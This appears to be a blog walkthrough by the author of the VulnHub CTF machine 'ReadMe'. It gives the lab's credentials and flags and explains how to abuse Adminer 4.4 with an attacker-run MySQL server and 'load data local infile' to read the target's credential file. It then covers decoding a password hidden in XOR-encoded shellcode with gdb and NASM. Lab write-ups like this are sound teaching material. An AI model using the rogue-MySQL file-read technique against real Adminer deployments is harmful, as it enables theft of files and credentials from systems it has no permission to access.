---
layout: post
title: ReadMe Walkthrough
date: 2019-08-18
categories:
  - security
  - ctf
  - walkthrough
tags:
  - vulnhub
  - readme
image: /assets/images/2019-08-18-readme-walkthrough/adminer-exploit.png
---
Overview
--------
ReadMe is aiming to teach users about two things. One, a feature of MySQL that I have found to not be widely known about - which is that the client can be forced to send local files to the server. Two, some basic x86 assembly and analysis with gdb.

Network Configuration
---------------------
ReadMe is currently using DHCP on the `ens33` interface. This can be configured using `netplan`.

The open ports are 22 (SSH), 3360 (a fake MySQL server), and 80 (Apache).

User Credentials
----------------
`tatham:So...YouFiguredOutHowToRecoverThisHuh?GGWPnoRE`
`julian:I_mean...WhoThoughtLettingTheMySQLClientTransmitFilesWasAGoodIdea?Sheesh`

Both these users can login via SSH (required as part of the challenge). Julian is not part of the sudo group but tatham is.

Flags
-----
- User: 2e640cbe2ea53070a0dbd3e5104e7c98
- Root: 52eeb6cfa53008c6b87a6c79f4347275

Path To User Flag
-----------------
Initially, the user will be able to see three open ports:

- 22
- 80
- 3306

The service listening on port 3306 is a Python script that accepts connections and mimics a MySQL server with remote authentication disabled. This is part rabbit-hole and part resource saver, given there is no need to have MySQL running.

On port 80, a web server can be found which needs to be brute forced to find some key files:

- `/info.php`: shows `phpinfo()` output, which will show that the `mysqli.allow_local_infile` setting is enabled
- `/reminder.php`: contains an important hint for the root flag (that the code in tatham’s directory is using an encoder) and will also reveal the path of a directory containing an important file
- `/adminer.php`: a copy of adminer 4.4

Upon visiting `reminder.php`, the user will see a message directed towards `julian` followed by an image which is being served from a directory with no index that also contains a file named `creds.txt`. This file will reveal the path to where julian’s login credentials can be found on the local file system (`/etc/julian.txt`).

With this information, the user can point adminer towards their own MySQL server in order to exfiltrate the contents of `/etc/julian.txt`. To do this, a MySQL server must be installed (`apt install mysql-server`) and a user created that has all privileges on a database (this can be any database, for example’s sake, I’ll be using the `mysql` database).

When creating the user, the authentication type must be set to `mysql_native_password` due to the mysqli driver not supporting the latest default authentication method. If it is not, adminer will indicate to the user that it cannot authenticate and output a MySQL error.

To setup a user this way, the following command should be executed in the MySQL CLI:

```sql
CREATE USER 'jeff'@'%' IDENTIFIED WITH mysql_native_password BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'jeff'@'%';
```

Now that a new user is setup (in this case, `jeff`), the `local_infile` variable on the user’s MySQL server needs to be enabled. To do this, execute:

```sql
SET GLOBAL local_infile = true;
```

The setting can then be confirmed by running:

```sql
SHOW GLOBAL VARIABLES LIKE 'local_infile';
```
If the setting was successfully enabled, the following output will be displayed:

```
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| local_infile  | ON    |
+---------------+-------+
```

Now that the attacker’s MySQL server is setup, navigating to `/adminer.php` and filling in the connection details will force adminer to connect back to the attacker, where they will then be viewing their own database server in the web app.

From here, files local to ReadMe can be exfiltrated to the attacker using the `local infile` syntax. First, the user must create a new table to save the data into. For this example, I have created a table named `exploit` with a single text column.

After creating the table, going to the SQL command page and executing the following query will populate the exploit table with the contents of `/etc/julian.txt`:

```sql
load data local infile '/etc/julian.txt' into table mysql.exploit fields terminated by "\n"
```

After executing this query, clicking "select" to the left of the exploit table will reveal a row for each line in the file, which reveals the password for the `julian` account:

![](/assets/images/2019-08-18-readme-walkthrough/adminer-exploit.png)

With the password recovered, the user can then login via SSH as `julian` using the password and get the user flag from `/home/julian/user.txt`

Path to Root Flag
-----------------
After authenticating as julian, the user will be able to see the contents of tatham’s home directory. Within this directory are two files:

- `payload.bin`: a file containing shellcode, which contains tatham’s password
- `poc.c`: a file that the shellcode can be placed in to run it

There are two methods that can be used to decode the payload and recover the password.

### Method 1: Debugging
First, place the contents of `payload.bin` into the placeholder of `poc.c` and compile with protections disabled:

```bash
gcc -m32 -fno-stack-protector -z execstack poc.c -o poc
```

Next, load `poc` into gdb (`gdb ./poc`) and disassemble the main function to find the point which the shellcode is called by running `disas main`:

![](/assets/images/2019-08-18-readme-walkthrough/root_001.png)

After confirming the offset, place a breakpoint (`b *main+164`) and then run the executable. Once the breakpoint is hit, stepping into the `call eax` instruction will then leave the user at the point of the xorfuscator decoder stub being executed:

![](/assets/images/2019-08-18-readme-walkthrough/root_002.png)

Once here, viewing the next 15 instructions that are to be executed (`x/15i $pc`) will reveal the address that the decoded payload can be found at after the stub has finished (in this case, `0xffffc595`, this value will change every time due to ASLR):

![](/assets/images/2019-08-18-readme-walkthrough/root_003.png)

A breakpoint should be placed here (`b *0xffffc595`) and once it is hit, after continuing execution, should be stepped into. Now EIP will be pointing at the original shellcode that has been decoded in place.

By viewing the next 70 instructions (`x/70i $pc`), the user will be able to dump out the original un-encoded instructions (the screenshot below was taken after stepping one instruction further in, in the original shellcode, there is a `mov ebp, esp` instruction before the first `xor`):

![](/assets/images/2019-08-18-readme-walkthrough/root_004.png)

Continuing to execute from this point will result in the password not being revealed, as the original payload contains two key mistakes that need to be fixed if the user wishes to reveal it via execution.

Examining the recovered code will show 64 bytes being repeatedly loaded into the `eax` register, even though the rest of the code is trying to work with a value on the stack. This should make it clear that the `lea eax` instructions should actually be `push` instructions.

In addition to this, the decoder loop is exiting after the first iteration as a `jz` instruction is being used as opposed to a `jnz`.

A copy of the working and broken payloads can be found at the end of this post.

After reconstructing the NASM file to represent something functionally equivalent to the original code (see sample at end of this post), it can be compiled by running (assuming the code is in a file named fixed.nasm):

```bash
nasm -f elf32 fixed.nasm && ld -m elf_i386 fixed.o
```

The previous command will now have built a file named `a.out` which is the fixed executable, running this in gdb will make execution pause when it reaches the interrupts at the end of the file, and the base64 encoded password will be visible on the stack:

![](/assets/images/2019-08-18-readme-walkthrough/root_005.png)

Decoding this value will reveal the password for the `tatham` account, which if the user logs into will be able to run any command as root using sudo, and will be able to then obtain the root flag.

### Method 2: Manually Decoding
The alternative to recovering the decoded payload using gdb is to do it manually. Due to the relatively small size of the payload, this is doable and may make the process slightly easier if the encoding method can be identified.

The encoder used as well as a script that contains the decoder stub is publicly documented here: [https://rastating.github.io/creating-a-custom-shellcode-encoder/](https://rastating.github.io/creating-a-custom-shellcode-encoder/)

By first removing the decoder stub from the contents of `payload.bin`, the user will be left with only the encoded payload. The user can then work through the remaining values and XOR each pair with the byte that precedes it as per the illustration on the aforementioned page:

![](/assets/images/2019-08-18-readme-walkthrough/xorfuscator.png)

After recovering the original hexadecimal bytes, the ASM code can be recovered using `ndisasm`, as per below:

```bash
$ echo -ne "\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8d\x05\x12\x13\x7f\x7f\x8d\x05\x22\x2f\x7b\x15\x8d\x05\x12\x73\x24\x13\x8d\x05\x23\x04\x7b\x08\x8d\x05\x22\x70\x28\x73\x8d\x05\x12\x09\x28\x30\x8d\x05\x20\x2f\x16\x3b\x8d\x05\x19\x19\x0e\x36\x8d\x05\x13\x09\x7b\x15\x8d\x05\x60\x09\x7b\x75\x8d\x05\x10\x75\x16\x70\x8d\x05\x25\x2f\x16\x2d\x8d\x05\x23\x19\x24\x73\x8d\x05\x27\x75\x16\x09\x8d\x05\x0c\x2b\x77\x1a\x8d\x05\x17\x72\x78\x37\x8d\x4d\x00\x29\xe1\x8d\x15\x14\x00\x00\x00\x39\xd1\x74\x4a\x8d\x15\x18\x00\x00\x00\x39\xd1\x74\x48\x8d\x15\x1c\x00\x00\x00\x39\xd1\x74\x3e\x8d\x15\x20\x00\x00\x00\x39\xd1\x74\x3c\x8d\x15\x24\x00\x00\x00\x39\xd1\x74\x3a\x8d\x15\x28\x00\x00\x00\x39\xd1\x74\x38\x8d\x15\x2c\x00\x00\x00\x39\xd1\x74\x16\x8d\x15\x38\x00\x00\x00\x39\xd1\x74\x1c\xeb\x2a\xeb\xac\x8d\x1d\x46\x41\x41\x41\xeb\x28\x8d\x1d\x45\x41\x41\x41\xeb\x20\x8d\x1d\x42\x41\x41\x41\xeb\x18\x8d\x1d\x44\x41\x41\x41\xeb\x10\x8d\x1d\x34\x41\x41\x41\xeb\x08\x8d\x1d\x41\x41\x41\x41\xeb\x00\x8d\x45\x00\x29\xc8\x31\x18\x81\x28\x01\x01\x01\x01\x83\xe9\x04\x31\xc0\x39\xc1\x74\xb8\xcc\xcc\xcc\xcc" | ndisasm -b 32 -p intel -
00000000  89E5              mov ebp,esp
00000002  31C0              xor eax,eax
00000004  31DB              xor ebx,ebx
00000006  31C9              xor ecx,ecx
00000008  31D2              xor edx,edx
0000000A  8D0512137F7F      lea eax,[dword 0x7f7f1312]
00000010  8D05222F7B15      lea eax,[dword 0x157b2f22]
00000016  8D0512732413      lea eax,[dword 0x13247312]
0000001C  8D0523047B08      lea eax,[dword 0x87b0423]
00000022  8D0522702873      lea eax,[dword 0x73287022]
00000028  8D0512092830      lea eax,[dword 0x30280912]
0000002E  8D05202F163B      lea eax,[dword 0x3b162f20]
00000034  8D0519190E36      lea eax,[dword 0x360e1919]
0000003A  8D0513097B15      lea eax,[dword 0x157b0913]
00000040  8D0560097B75      lea eax,[dword 0x757b0960]
00000046  8D0510751670      lea eax,[dword 0x70167510]
0000004C  8D05252F162D      lea eax,[dword 0x2d162f25]
00000052  8D0523192473      lea eax,[dword 0x73241923]
00000058  8D0527751609      lea eax,[dword 0x9167527]
0000005E  8D050C2B771A      lea eax,[dword 0x1a772b0c]
00000064  8D0517727837      lea eax,[dword 0x37787217]
0000006A  8D4D00            lea ecx,[ebp+0x0]
0000006D  29E1              sub ecx,esp
0000006F  8D1514000000      lea edx,[dword 0x14]
00000075  39D1              cmp ecx,edx
00000077  744A              jz 0xc3
00000079  8D1518000000      lea edx,[dword 0x18]
0000007F  39D1              cmp ecx,edx
00000081  7448              jz 0xcb
00000083  8D151C000000      lea edx,[dword 0x1c]
00000089  39D1              cmp ecx,edx
0000008B  743E              jz 0xcb
0000008D  8D1520000000      lea edx,[dword 0x20]
00000093  39D1              cmp ecx,edx
00000095  743C              jz 0xd3
00000097  8D1524000000      lea edx,[dword 0x24]
0000009D  39D1              cmp ecx,edx
0000009F  743A              jz 0xdb
000000A1  8D1528000000      lea edx,[dword 0x28]
000000A7  39D1              cmp ecx,edx
000000A9  7438              jz 0xe3
000000AB  8D152C000000      lea edx,[dword 0x2c]
000000B1  39D1              cmp ecx,edx
000000B3  7416              jz 0xcb
000000B5  8D1538000000      lea edx,[dword 0x38]
000000BB  39D1              cmp ecx,edx
000000BD  741C              jz 0xdb
000000BF  EB2A              jmp short 0xeb
000000C1  EBAC              jmp short 0x6f
000000C3  8D1D46414141      lea ebx,[dword 0x41414146]
000000C9  EB28              jmp short 0xf3
000000CB  8D1D45414141      lea ebx,[dword 0x41414145]
000000D1  EB20              jmp short 0xf3
000000D3  8D1D42414141      lea ebx,[dword 0x41414142]
000000D9  EB18              jmp short 0xf3
000000DB  8D1D44414141      lea ebx,[dword 0x41414144]
000000E1  EB10              jmp short 0xf3
000000E3  8D1D34414141      lea ebx,[dword 0x41414134]
000000E9  EB08              jmp short 0xf3
000000EB  8D1D41414141      lea ebx,[dword 0x41414141]
000000F1  EB00              jmp short 0xf3
000000F3  8D4500            lea eax,[ebp+0x0]
000000F6  29C8              sub eax,ecx
000000F8  3118              xor [eax],ebx
000000FA  812801010101      sub dword [eax],0x1010101
00000100  83E904            sub ecx,byte +0x4
00000103  31C0              xor eax,eax
00000105  39C1              cmp ecx,eax
00000107  74B8              jz 0xc1
00000109  CC                int3
0000010A  CC                int3
0000010B  CC                int3
0000010C  CC                int3
```

After recovering the original payload, the user can either fix it as per the explanation in method 1, or they can try to analyse what is happening in the loop which is XORing the 64 encoded bytes on the stack against the below key and shifting the ASCII values negatively one position:

`AAAAAAAADAAAAAAAAAAAEAAA4AAADAAABAAAEAAAEAAAFAAAAAAAAAAAAAAAAAAA`

An illustration of the decoding process can be viewed on CyberChef here: [https://gchq.github.io/CyberChef/#recipe=From_Hex('Space')XOR(%7B'option':'UTF8','string':'AAAAAAAADAAAAAAAAAAAEAAA4AAADAAABAAAEAAAEAAAFAAAAAAAAAAAAAAAAAAA'%7D,'Standard',false)ROT47(-1)From_Base64('A-Za-z0-9%2B/%3D',true)&input=MTcgNzIgNzggMzcgMGMgMmIgNzcgMWEgMjcgNzUgMTYgMDkgMjMgMTkgMjQgNzMgMjUgMmYgMTYgMmQgMTAgNzUgMTYgNzAgNjAgMDkgN2IgNzUgMTMgMDkgN2IgMTUgMTkgMTkgMGUgMzYgMjAgMmYgMTYgM2IgMTIgMDkgMjggMzAgMjIgNzAgMjggNzMgMjMgMDQgN2IgMDggMTIgNzMgMjQgMTMgMjIgMmYgN2IgMTUgMTIgMTMgN2YgN2Y](https://gchq.github.io/CyberChef/#recipe=From_Hex('Space')XOR(%7B'option':'UTF8','string':'AAAAAAAADAAAAAAAAAAAEAAA4AAADAAABAAAEAAAEAAAFAAAAAAAAAAAAAAAAAAA'%7D,'Standard',false)ROT47(-1)From_Base64('A-Za-z0-9%2B/%3D',true)&input=MTcgNzIgNzggMzcgMGMgMmIgNzcgMWEgMjcgNzUgMTYgMDkgMjMgMTkgMjQgNzMgMjUgMmYgMTYgMmQgMTAgNzUgMTYgNzAgNjAgMDkgN2IgNzUgMTMgMDkgN2IgMTUgMTkgMTkgMGUgMzYgMjAgMmYgMTYgM2IgMTIgMDkgMjggMzAgMjIgNzAgMjggNzMgMjMgMDQgN2IgMDggMTIgNzMgMjQgMTMgMjIgMmYgN2IgMTUgMTIgMTMgN2YgN2Y)

At this point, they can use the recovered password to login as `tatham` and retrieve the root flag using sudo as per method 1.

Fixed Payload
-------------
```nasm
global _start

section .text
  _start:
    ; set the frame pointer
    mov   ebp, esp

    ; clear required registers
    xor   eax, eax
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx

    ; push encoded password onto stack
    push  0x7f7f1312
    push  0x157b2f22
    push  0x13247312
    push  0x087b0423
    push  0x73287022
    push  0x30280912
    push  0x3b162f20
    push  0x360e1919
    push  0x157b0913
    push  0x757b0960
    push  0x70167510
    push  0x2d162f25
    push  0x73241923
    push  0x09167527
    push  0x1a772b0c
    push  0x37787217

    ; calculate size of password and store in $ecx
    lea   ecx, [ebp]
    sub   ecx, esp

    ; begin xor on the encoded password
    decode_loop:
      ; if at dword 12, xor with F
      lea   edx, [0x14]
      cmp   ecx, edx
      jz    xor_f

      ; if at dword 11, xor with E
      lea   edx, [0x18]
      cmp   ecx, edx
      jz    xor_e

      ; if at dword 10, xor with E
      lea   edx, [0x1c]
      cmp   ecx, edx
      jz    xor_e

      ; if at dword 9, xor with B
      lea   edx, [0x20]
      cmp   ecx, edx
      jz    xor_b

      ; if at dword 8, xor with D
      lea   edx, [0x24]
      cmp   ecx, edx
      jz    xor_d

      ; if at dword 7, xor with 4
      lea   edx, [0x28]
      cmp   ecx, edx
      jz    xor_4

      ; if at dword 6, xor with E
      lea   edx, [0x2c]
      cmp   ecx, edx
      jz    xor_e

      ; if at dword 3, xor with D
      lea   edx, [0x38]
      cmp   ecx, edx
      jz    xor_d

      ; if at none of the unique indexes
      ; xor with A.
      jmp   xor_a

      short_loop_jmp:
        jmp decode_loop

      xor_f:
        lea   ebx, [0x41414146]
        jmp   xor_eof

      xor_e:
        lea   ebx, [0x41414145]
        jmp   xor_eof

      xor_b:
        lea   ebx, [0x41414142]
        jmp   xor_eof

      xor_d:
        lea   ebx, [0x41414144]
        jmp   xor_eof

      xor_4:
        lea   ebx, [0x41414134]
        jmp   xor_eof

      xor_a:
        lea   ebx, [0x41414141]
        jmp   xor_eof

      xor_eof:
        lea   eax, [ebp]
        sub   eax, ecx
        xor   [eax], ebx
        sub   dword [eax], 0x01010101

        sub   ecx, 0x4

    xor   eax, eax
    cmp   ecx, eax
    jnz   short_loop_jmp

    int3
    int3
    int3
    int3
```

Original (Broken) Payload
-------------------------
```nasm
global _start

section .text
  _start:
    ; set the frame pointer
    mov   ebp, esp

    ; clear required registers
    xor   eax, eax
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx

    ; Challenge 1: stack push broken with loading into eax register
    lea   eax, [0x7f7f1312]
    lea   eax, [0x157b2f22]
    lea   eax, [0x13247312]
    lea   eax, [0x087b0423]
    lea   eax, [0x73287022]
    lea   eax, [0x30280912]
    lea   eax, [0x3b162f20]
    lea   eax, [0x360e1919]
    lea   eax, [0x157b0913]
    lea   eax, [0x757b0960]
    lea   eax, [0x70167510]
    lea   eax, [0x2d162f25]
    lea   eax, [0x73241923]
    lea   eax, [0x09167527]
    lea   eax, [0x1a772b0c]
    lea   eax, [0x37787217]

    ; calculate size of password and store in $ecx
    lea   ecx, [ebp]
    sub   ecx, esp

    ; begin xor on the encoded password
    decode_loop:
      ; if at dword 12, xor with F
      lea   edx, [0x14]
      cmp   ecx, edx
      jz    xor_f

      ; if at dword 11, xor with E
      lea   edx, [0x18]
      cmp   ecx, edx
      jz    xor_e

      ; if at dword 10, xor with E
      lea   edx, [0x1c]
      cmp   ecx, edx
      jz    xor_e

      ; if at dword 9, xor with B
      lea   edx, [0x20]
      cmp   ecx, edx
      jz    xor_b

      ; if at dword 8, xor with D
      lea   edx, [0x24]
      cmp   ecx, edx
      jz    xor_d

      ; if at dword 7, xor with 4
      lea   edx, [0x28]
      cmp   ecx, edx
      jz    xor_4

      ; if at dword 6, xor with E
      lea   edx, [0x2c]
      cmp   ecx, edx
      jz    xor_e

      ; if at dword 3, xor with D
      lea   edx, [0x38]
      cmp   ecx, edx
      jz    xor_d

      ; if at none of the unique indexes
      ; xor with A.
      jmp   xor_a

      short_loop_jmp:
        jmp decode_loop

      xor_f:
        lea   ebx, [0x41414146]
        jmp   xor_eof

      xor_e:
        lea   ebx, [0x41414145]
        jmp   xor_eof

      xor_b:
        lea   ebx, [0x41414142]
        jmp   xor_eof

      xor_d:
        lea   ebx, [0x41414144]
        jmp   xor_eof

      xor_4:
        lea   ebx, [0x41414134]
        jmp   xor_eof

      xor_a:
        lea   ebx, [0x41414141]
        jmp   xor_eof

      xor_eof:
        lea   eax, [ebp]
        sub   eax, ecx
        xor   [eax], ebx
        sub   dword [eax], 0x01010101

        sub   ecx, 0x4

    xor   eax, eax
    cmp   ecx, eax

    ; Challenge 2: jnz changed to jz
    jz    short_loop_jmp

    int3
    int3
    int3
    int3
```
